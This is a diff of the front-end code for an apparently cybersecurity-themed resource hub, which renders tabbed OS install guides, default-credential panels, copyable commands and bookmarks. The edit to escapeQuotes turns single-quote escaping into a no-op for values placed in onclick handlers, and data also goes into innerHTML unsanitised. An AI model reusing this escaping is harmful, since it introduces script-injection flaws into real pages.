           <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 12px; margin-bottom: 20px;">
             <div style="background: rgba(255,255,255,0.03); border: 1px solid var(--border-card); border-radius: var(--radius-sm); padding: 14px;">
@@ -3570,162 +1481,83 @@
               <div style="font-size: 15px; font-weight: 700; color: #fff; margin-top: 4px;">${guide.specs.diskSpace} (Rec: ${guide.specs.recDisk})</div>
             </div>
             <div style="background: rgba(255,255,255,0.03); border: 1px solid var(--border-card); border-radius: var(--radius-sm); padding: 14px;">
-              <div style="font-size: 11px; color: var(--text-muted); font-family: var(--font-mono);">BIOS SETTING</div>
-              <div style="font-size: 15px; font-weight: 700; color: #10b981; margin-top: 4px;">Intel VT-x / AMD-V Enabled</div>
+              <div style="font-size: 11px; color: var(--text-muted); font-family: var(--font-mono);">BIOS STATUS</div>
+              <div style="font-size: 15px; font-weight: 700; color: #10b981; margin-top: 4px;">VT-x / AMD-V Required</div>
             </div>
           </div>
-
-          <div style="background: rgba(16, 185, 129, 0.08); border: 1px solid rgba(16, 185, 129, 0.25); border-radius: var(--radius-sm); padding: 14px; font-size: 13px; color: #d1fae5; line-height: 1.5;">
-            <i class="fa-solid fa-circle-check" style="color: #10b981; margin-right: 6px;"></i>
-            <strong>Virtualization Check:</strong> Ensure Intel Virtualization Technology (VT-x) or AMD SVM is set to <strong>Enabled</strong> in your laptop/PC BIOS setup before launching VMware or VirtualBox.
-          </div>
         `;
-      }
-      // Tab: VMware Workstation Steps
-      else if (activeTab === 'vmware' && guide.installProcesses.vmware) {
-        const proc = guide.installProcesses.vmware;
-        tabBodyHtml = `
-          <div style="margin-bottom: 16px;">
-            <h3 style="font-size: 18px; color: #fff; margin-bottom: 6px;">${proc.platformTitle}</h3>
-            <p style="font-size: 13.5px; color: var(--text-secondary); line-height: 1.5;">${proc.platformDesc}</p>
-          </div>
-          ${renderGuideSteps(proc.steps)}
-        `;
-      }
-      // Tab: VirtualBox Steps
-      else if (activeTab === 'virtualbox' && guide.installProcesses.virtualbox) {
-        const proc = guide.installProcesses.virtualbox;
-        tabBodyHtml = `
-          <div style="margin-bottom: 16px;">
-            <h3 style="font-size: 18px; color: #fff; margin-bottom: 6px;">${proc.platformTitle}</h3>
-            <p style="font-size: 13.5px; color: var(--text-secondary); line-height: 1.5;">${proc.platformDesc}</p>
-          </div>
-          ${renderGuideSteps(proc.steps)}
-        `;
-      }
-      // Tab: WSL2 Steps
-      else if (activeTab === 'wsl2' && guide.installProcesses.wsl2) {
-        const proc = guide.installProcesses.wsl2;
-        tabBodyHtml = `
-          <div style="margin-bottom: 16px;">
-            <h3 style="font-size: 18px; color: #fff; margin-bottom: 6px;">${proc.platformTitle}</h3>
-            <p style="font-size: 13.5px; color: var(--text-secondary); line-height: 1.5;">${proc.platformDesc}</p>
-          </div>
-          ${renderGuideSteps(proc.steps)}
-        `;
-      }
-      // Tab: Bare Metal Steps
-      else if (activeTab === 'baremetal' && guide.installProcesses.baremetal) {
-        const proc = guide.installProcesses.baremetal;
-        tabBodyHtml = `
-          <div style="margin-bottom: 16px;">
-            <h3 style="font-size: 18px; color: #fff; margin-bottom: 6px;">${proc.platformTitle}</h3>
-            <p style="font-size: 13.5px; color: var(--text-secondary); line-height: 1.5;">${proc.platformDesc}</p>
-          </div>
-          ${renderGuideSteps(proc.steps)}
-        `;
-      }
-      // Tab: First Boot & Passwords
-      else if (activeTab === 'firstboot' && guide.firstBoot) {
+      } else if (activeTab === 'vmware' && guide.installProcesses.vmware) {
+        tabBodyHtml = renderGuideSteps(guide.installProcesses.vmware.steps);
+      } else if (activeTab === 'virtualbox' && guide.installProcesses.virtualbox) {
+        tabBodyHtml = renderGuideSteps(guide.installProcesses.virtualbox.steps);
+      } else if (activeTab === 'wsl2' && guide.installProcesses.wsl2) {
+        tabBodyHtml = renderGuideSteps(guide.installProcesses.wsl2.steps);
+      } else if (activeTab === 'baremetal' && guide.installProcesses.baremetal) {
+        tabBodyHtml = renderGuideSteps(guide.installProcesses.baremetal.steps);
+      } else if (activeTab === 'firstboot' && guide.firstBoot) {
         const fb = guide.firstBoot;
         tabBodyHtml = `
           ${fb.credentials ? `
             <div style="background: rgba(255, 0, 56, 0.1); border: 1px solid var(--crimson-primary); border-radius: var(--radius-md); padding: 18px; margin-bottom: 20px;">
               <div style="font-family: var(--font-mono); font-size: 11px; color: var(--crimson-light); text-transform: uppercase; margin-bottom: 8px;">
-                // DEFAULT LOGIN CREDENTIALS:
+                // DEFAULT CREDENTIALS:
               </div>
               <div style="display: flex; gap: 24px; flex-wrap: wrap;">
                 <div>
-                  <span style="font-size: 12px; color: var(--text-muted);">Default Username:</span>
+                  <span style="font-size: 12px; color: var(--text-muted);">Username:</span>
                   <div style="font-family: var(--font-mono); font-size: 17px; font-weight: 800; color: #fff;">${fb.credentials.username}</div>
                 </div>
                 <div>
-                  <span style="font-size: 12px; color: var(--text-muted);">Default Password:</span>
+                  <span style="font-size: 12px; color: var(--text-muted);">Password:</span>
                   <div style="font-family: var(--font-mono); font-size: 17px; font-weight: 800; color: var(--crimson-light);">${fb.credentials.password}</div>
                 </div>
-                ${fb.credentials.rootAccess ? `
-                  <div>
-                    <span style="font-size: 12px; color: var(--text-muted);">Root Escalation:</span>
-                    <div style="font-family: var(--font-mono); font-size: 14px; font-weight: 700; color: #38bdf8;">${fb.credentials.rootAccess}</div>
-                  </div>
-                ` : ''}
               </div>
             </div>
           ` : ''}
-
-          <h3 style="font-size: 16px; color: #fff; margin-bottom: 14px; font-family: var(--font-mono);">
-            // ESSENTIAL POST-INSTALL CONFIGURATIONS:
-          </h3>
           ${renderGuideSteps(fb.postInstallSteps)}
         `;
-      }
-      // Tab: How to Use & Commands
-      else if (activeTab === 'usage' && guide.howToUse) {
-        const usage = guide.howToUse;
-        tabBodyHtml = `
-          <div style="background: rgba(0,0,0,0.5); border: 1px solid var(--border-card); border-radius: var(--radius-md); padding: 18px; margin-bottom: 20px;">
-            <div style="font-family: var(--font-mono); font-size: 11px; color: var(--crimson-light); text-transform: uppercase; margin-bottom: 6px;">
-              // PRACTICAL USAGE PHILOSOPHY:
+      } else if (activeTab === 'usage' && guide.howToUse) {
+        tabBodyHtml = guide.howToUse.coreWorkflows.map(wf => `
+          <div class="guide-step-card">
+            <div style="display: flex; align-items: center; justify-content: space-between; flex-wrap: wrap; gap: 8px; margin-bottom: 6px;">
+              <span style="font-size: 15px; font-weight: 700; color: #fff;">${wf.name}</span>
+              <span style="font-family: var(--font-mono); font-size: 10.5px; color: var(--crimson-light); background: rgba(255, 0, 56, 0.1); padding: 2px 8px; border-radius: 4px;">${wf.purpose}</span>
             </div>
-            <p style="font-size: 14px; color: var(--text-primary); line-height: 1.6;">
-              ${usage.summary}
+            <p style="font-size: 13px; color: var(--text-secondary); line-height: 1.5; margin-bottom: 8px;">
+              ${wf.explanation}
             </p>
+            <div class="guide-code-box">
+              <code>${wf.command}</code>
+              <button type="button" class="guide-copy-btn" onclick="copySnippet('${escapeQuotes(wf.command)}')">
+                <i class="fa-regular fa-copy"></i> Copy
+              </button>
+            </div>
           </div>
-
-          <h3 style="font-size: 16px; color: #fff; margin-bottom: 14px; font-family: var(--font-mono);">
-            // CORE TERMINAL COMMANDS &amp; WORKFLOWS:
-          </h3>
-          ${usage.coreWorkflows.map(wf => `
-            <div class="guide-step-card">
-              <div style="display: flex; align-items: center; justify-content: space-between; flex-wrap: wrap; gap: 8px; margin-bottom: 6px;">
-                <span style="font-size: 15px; font-weight: 700; color: #fff;">${wf.name}</span>
-                <span style="font-family: var(--font-mono); font-size: 10.5px; color: var(--crimson-light); background: rgba(255, 0, 56, 0.1); padding: 2px 8px; border-radius: 4px;">${wf.purpose}</span>
-              </div>
-              <p style="font-size: 13px; color: var(--text-secondary); line-height: 1.5; margin-bottom: 8px;">
-                ${wf.explanation}
-              </p>
+        `).join('');
+      } else if (activeTab === 'troubleshooting' && guide.troubleshooting) {
+        tabBodyHtml = guide.troubleshooting.map((item, idx) => `
+          <div class="guide-step-card" style="border-left: 3px solid var(--crimson-primary);">
+            <div style="font-size: 14.5px; font-weight: 700; color: #fff; margin-bottom: 8px;">
+              Issue #${idx + 1}: ${item.issue}
+            </div>
+            <p style="font-size: 13.5px; color: #e4e4e7; line-height: 1.6; margin-bottom: 10px;">
+              <strong>Fix:</strong> ${item.solution}
+            </p>
+            ${item.fixCommand ? `
               <div class="guide-code-box">
-                <code>${wf.command}</code>
-                <button type="button" class="guide-copy-btn" onclick="copySnippet('${escapeQuotes(wf.command)}')">
-                  <i class="fa-regular fa-copy"></i> Copy Command
+                <code>${item.fixCommand}</code>
+                <button type="button" class="guide-copy-btn" onclick="copySnippet('${escapeQuotes(item.fixCommand)}')">
+                  <i class="fa-regular fa-copy"></i> Copy Fix
                 </button>
               </div>
-            </div>
-          `).join('')}
-        `;
-      }
-      // Tab: Troubleshooting
-      else if (activeTab === 'troubleshooting' && guide.troubleshooting) {
-        tabBodyHtml = `
-          <div style="margin-bottom: 16px;">
-            <h3 style="font-size: 17px; color: #fff; margin-bottom: 6px;">Frequently Encountered Setup Errors &amp; Fixes</h3>
-            <p style="font-size: 13px; color: var(--text-secondary);">If you encounter an issue or error during setup, apply these verified solutions:</p>
+            ` : ''}
           </div>
-          ${guide.troubleshooting.map((item, idx) => `
-            <div class="guide-step-card" style="border-left: 3px solid var(--crimson-primary);">
-              <div style="font-size: 14.5px; font-weight: 700; color: #fff; margin-bottom: 8px;">
-                <i class="fa-solid fa-triangle-exclamation text-crimson" style="margin-right: 6px;"></i>
-                Issue #${idx + 1}: ${item.issue}
-              </div>
-              <p style="font-size: 13.5px; color: #e4e4e7; line-height: 1.6; margin-bottom: 10px;">
-                <strong>Fix:</strong> ${item.solution}
-              </p>
-              ${item.fixCommand ? `
-                <div class="guide-code-box">
-                  <code>${item.fixCommand}</code>
-                  <button type="button" class="guide-copy-btn" onclick="copySnippet('${escapeQuotes(item.fixCommand)}')">
-                    <i class="fa-regular fa-copy"></i> Copy Fix
-                  </button>
-                </div>
-              ` : ''}
-            </div>
-          `).join('')}
-        `;
+        `).join('');
       }
 
       container.innerHTML = `
         <div style="display: flex; align-items: center; gap: 10px; margin-bottom: 10px; flex-wrap: wrap;">
-          <span class="hub-cat-badge ${guide.categoryBadgeClass || 'badge-tools'}">${guide.categoryText || 'MASTER GUIDE'}</span>
+          <span class="hub-cat-badge ${guide.categoryBadgeClass || 'badge-tools'}">${guide.categoryText || 'DEPLOYMENT GUIDE'}</span>
           <span style="font-family: var(--font-mono); font-size: 11px; color: var(--text-muted); text-transform: uppercase;">
             Target: <strong style="color: #fff;">${guide.target}</strong> &bull; Setup Time: <strong style="color: var(--crimson-light);">${guide.setupTime}</strong>
           </span>
@@ -3736,19 +1568,16 @@
           ${guide.title}
         </h2>
 
-        <!-- Interactive Platform Tabs Navigation -->
         <div class="guide-tabs-nav">
           ${tabsHtml}
         </div>
 
-        <!-- Dynamic Active Tab Content -->
         <div class="guide-tab-content">
           ${tabBodyHtml}
         </div>
       `;
     }
 
-    // Render Steps List Helper
     function renderGuideSteps(steps) {
       if (!steps || !steps.length) return '';
       return steps.map((s, idx) => `
@@ -3768,33 +1597,24 @@
               </button>
             </div>
           ` : ''}
-          ${s.note ? `
-            <div style="font-size: 12px; color: var(--text-muted); margin-top: 8px; font-family: var(--font-mono);">
-              <i class="fa-solid fa-circle-info" style="color: var(--crimson-light); margin-right: 4px;"></i> Note: ${s.note}
-            </div>
-          ` : ''}
         </div>
       `).join('');
     }
 
-    // Toggle Bookmark in LocalStorage
     function toggleBookmark(id, btnEl) {
       const idx = bookmarkedIds.indexOf(id);
       if (idx > -1) {
         bookmarkedIds.splice(idx, 1);
-        showToast("Bookmark removed from your vault");
+        showToast("Bookmark removed");
       } else {
         bookmarkedIds.push(id);
-        showToast("✓ Resource saved to your bookmarks!");
+        showToast("✓ Saved to bookmarks!");
       }
       localStorage.setItem('cyber_hub_bookmarks', JSON.stringify(bookmarkedIds));
-      updateCategoryCounts();
-      renderResources();
+      renderCurrentView();
     }
 
-    // Copy to clipboard helper
     function copySnippet(text) {
-      // Decode HTML entities if any
       const temp = document.createElement('textarea');
       temp.innerHTML = text;
       const clean = temp.value;
@@ -3806,7 +1626,6 @@
       });
     }
 
-    // Open Resource Details Modal
     function openResourceModal(id) {
       const item = CYBER_RESOURCES.find(r => r.id === id);
       if (!item) return;
@@ -3821,7 +1640,7 @@
         <div style="display: flex; align-items: center; gap: 10px; margin-bottom: 12px;">
           <span class="hub-cat-badge ${item.badgeClass}">${item.badgeText}</span>
           <span style="font-family: var(--font-mono); font-size: 11px; color: var(--text-muted); text-transform: uppercase;">
-            Difficulty / Level: <strong style="color: #fff;">${item.level}</strong>
+            Level: <strong style="color: #fff;">${item.level}</strong>
           </span>
         </div>
 
@@ -3836,7 +1655,7 @@
 
         <div style="background: rgba(0,0,0,0.5); border: 1px solid var(--border-card); border-radius: var(--radius-md); padding: 16px; margin-bottom: 20px;">
           <div style="font-family: var(--font-mono); font-size: 11px; color: var(--crimson-light); margin-bottom: 6px; text-transform: uppercase;">
-            // OPERATIONAL BRIEFING &amp; FIELD NOTES:
+            // OPERATIONAL BRIEFING:
           </div>
           <p style="font-size: 13px; color: var(--text-primary); line-height: 1.6;">
             ${item.details}
@@ -3846,7 +1665,7 @@
         ${item.code ? `
           <div style="margin-bottom: 24px;">
             <div style="font-family: var(--font-mono); font-size: 11px; color: var(--text-muted); margin-bottom: 6px;">
-              // QUICK SYNTAX / REPO COMMAND:
+              // TERMINAL COMMAND / REPO:
             </div>
             <div class="hub-code-preview" style="font-size: 13px; padding: 12px;">
               <span>${item.code}</span>
@@ -3860,7 +1679,7 @@
         <div style="display: flex; gap: 12px; flex-wrap: wrap;">
           <a href="${item.url}" target="_blank" rel="noopener noreferrer" class="hub-btn-action hub-btn-primary" style="padding: 12px 20px; font-size: 13px;">
             <i class="fa-solid fa-arrow-up-right-from-square"></i>
-            <span>${item.actionText || 'Open Direct Source'}</span>
+            <span>${item.actionText || 'Open Direct Link'}</span>
           </a>
           <button class="hub-btn-action hub-btn-secondary" onclick="toggleBookmark('${item.id}', this)" style="padding: 12px 18px; font-size: 13px;">
             <i class="${isBookmarked ? 'fa-solid' : 'fa-regular'} fa-star text-crimson"></i>
@@ -3884,19 +1703,6 @@
       document.getElementById('hubModalOverlay').classList.remove('active');
     }
 
-    // Reset Filters
-    function clearFilters() {
-      searchQuery = "";
-      document.getElementById('hubSearchInput').value = "";
-      currentCategory = "all";
-      document.querySelectorAll('.hub-filter-btn').forEach(b => {
-        b.classList.remove('active');
-        if (b.dataset.category === 'all') b.classList.add('active');
-      });
-      renderResources();
-    }
-
-    // Toast Messenger
     let toastTimeout = null;
     function showToast(msg) {
       const toast = document.getElementById('hubToast');
@@ -3911,7 +1717,7 @@
     }
 
     function escapeQuotes(str) {
-      return str.replace(/'/g, "\\'").replace(/"/g, '&quot;');
+      return str.replace(/'/g, "\'").replace(/"/g, '&quot;');
     }
   </script>
 </body>
